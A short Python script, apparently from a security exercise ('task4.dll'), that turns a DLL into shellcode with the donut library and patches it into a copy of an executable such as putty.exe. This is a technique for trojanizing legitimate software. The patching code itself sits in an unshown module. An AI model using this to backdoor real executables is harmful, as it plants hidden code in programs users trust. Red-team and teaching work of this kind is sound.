import sys
import argparse
import shutil
import donut
import patcher


def parse_cli_args():
    parser = argparse.ArgumentParser(description = "loader.py patches PE64 file with dynamic library.")
    parser.add_argument("-e", "--exe", required = True, type = str, default = "", help = "Executable PE64 file basename (.exe)")
    parser.add_argument("-d", "--dll", required = True, type = str, default = "", help = "DLL basename (.dll)")
    args = parser.parse_args()
    return args


def main():
    args = parse_cli_args()
    file_exe = args.exe
    file_dll = args.dll
    file_patched = f"patched.exe"

    shutil.copy(file_exe, file_patched)

    sc = donut.create(file = file_dll)
    print(f"[!] Shellcode size: {len(sc)}")

    patcher.patch(file_patched, sc)


if __name__ == "__main__":
    # # Simulation of CLI arguments. For debug only
    # exe = "putty.exe"
    # dll = "task4.dll"
    #
    # sys.argv = ["loader.py"]
    # sys.argv = ["loader.py", "--exe", exe, "--dll", dll]
    main()
